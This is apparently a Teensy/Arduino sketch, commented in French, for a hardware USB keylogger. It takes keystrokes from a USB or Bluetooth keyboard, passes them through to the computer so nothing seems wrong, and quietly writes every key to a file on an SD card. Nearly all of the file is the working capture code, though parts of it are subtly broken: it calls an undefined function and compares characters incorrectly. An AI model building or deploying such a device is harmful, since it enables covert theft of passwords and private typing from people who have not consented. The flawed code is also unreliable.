//Inclure les bibliothèques nécessaires
#include "USBHost_t36.h"
#include "SD.h"

//Définir les constantes
#define SHOW_KEYBOARD_DATA

//Déclarer les objets USB
File dataLog;
USBHost myusb;
USBHub hub1(myusb);
KeyboardController keyboard1(myusb);
BluetoothController bluet(myusb);

//Déclarer les objets HID Parser
USBHIDParser hid1(myusb);
USBHIDParser hid2(myusb);
USBHIDParser hid3(myusb);


void setup() {
  //Initialiser le port série si SHOW_KEYBOARD_DATA est défini
  #ifdef SHOW_KEYBOARD_DATA
    while (!Serial);
    Serial.println(">> House Of The Bees ! <<");
  #endif
    //Initialiser l'objet USB
    myusb.begin();

  //Configurer le clavier pour détecter les pressions
  #ifdef SHOW_KEYBOARD_DATA
    keyboard1.attachPress(OnPress);
  #endif

  //Vérifier si la carte SD est présente
  if (!SD.begin(BUILTIN_SDCARD)){
    Serial.println("SD card failed, or not present");
    return;
  }  
    uint64_t cardSize = SD.totalSize() / (1024 * 1024);
    Serial.print("Taille de la carte SD : ");
    Serial.print(cardSize);
    Serial.println(" Mo.");

  //Ouvrir le fichier de log de données
  dataLog = SD.open("dataLog.txt", FILE_WRITE);

}

//Méthode appelée en boucle
void loop() {
  myusb.Task();
}


//Définir les variables pour la surveillance des périphériques USB et HID
#ifdef SHOW_KEYBOARD_DATA
//Définir les pilotes USB à surveiller
USBDriver *drivers[] = {&hub1, &hid1, &hid2, &hid3, &bluet};
#define CNT_DEVICES (sizeof(drivers)/sizeof(drivers[0]))
const char * driver_names[CNT_DEVICES] = {"Hub1", "HID1" , "HID2", "HID3", "BlueTooth"};
bool driver_active[CNT_DEVICES] = {false, false, false};
//Définir les pilotes HID à surveiller
// Lets also look at HID Input devices
USBHIDInput *hiddrivers[] = { &keyboard1 };
#define CNT_HIDDEVICES (sizeof(hiddrivers) / sizeof(hiddrivers[0]))
const char *hid_driver_names[CNT_DEVICES] = { "KB" };
bool hid_driver_active[CNT_DEVICES] = { false };


//Définir les pilotes BTHID à surveiller
BTHIDInput *bthiddrivers[] = {&keyboard1};
#define CNT_BTHIDDEVICES (sizeof(bthiddrivers)/sizeof(bthiddrivers[0]))
const char * bthid_driver_names[CNT_HIDDEVICES] = {"KB(BT)"};
bool bthid_driver_active[CNT_HIDDEVICES] = {false};
#endif

bool charInCharArray(char c, char* charArray, int arraySize) {
  for (int i = 0; i < arraySize; i++) {
    if (charArray[i] == c) {
      return true;
    }
  }
  return false;
}
void OnPress(int key) {
  static File dataLog = SD.open("dataLog.txt", FILE_WRITE);
  static const char* specialKeys[] = {
                                    "UP", "DN", "LEFT", "RIGHT", "Ins", "Del", "PUP",
                                     "PDN", "HOME", "END", "F1", "F2", "F3", "F4", "F5",
                                     "F6", "F7", "F8", "F9", "F10", "F11", "F12"
                                };

    if (!in(key, specialKeys, sizeof(specialKeys) / sizeof(specialKeys[0]))) {
        Keyboard.print((char)key);
        dataLog.print((char)key);

        // For the ouput for debugging
        Serial.print((char)key);
        Serial.println(dataLog.size());
        uint64_t usedSize = SD.usedSize() / (1024 * 1024);
        Serial.print("Taille utilisée : ");
        Serial.print(usedSize);
        Serial.print(" Mo./");
        uint64_t cardSize = SD.totalSize() / (1024 * 1024);
        Serial.print(cardSize);
        Serial.println(" Mo.");

    }

    if((char)key == "\n" || (char)key == "\r")
        Serial.println("");

  
}
